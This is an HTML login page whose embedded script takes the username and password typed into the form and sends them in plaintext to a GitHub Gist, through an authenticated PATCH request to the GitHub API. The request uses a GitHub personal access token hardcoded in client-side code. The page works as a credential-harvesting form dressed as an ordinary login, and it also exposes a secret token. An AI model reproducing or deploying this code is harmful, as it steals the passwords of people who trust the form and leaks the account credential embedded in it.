<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>
<body>
    <h1>Login</h1>
    <form id="loginForm">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const data = {
                username: username,
                password: password
            };

            try {
                const response = await fetch('https://api.github.com/gists/a2a704439b6e63da0a509c1125f5a936', {
                    method: 'PATCH',
                    headers: {
                        'Authorization': 'token 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',
                        'Accept': 'application/vnd.github+json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        files: {
                            'login_data.txt': {
                                content: `Username: ${data.username}\nPassword: ${data.password}`
                            }
                        }
                    })
                });

                if (response.ok) {
                    alert('Login data has been sent to GitHub Gist.');
                } else {
                    alert('Failed to send login data.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred.');
            }
        });
    </script>
</body>
</html>
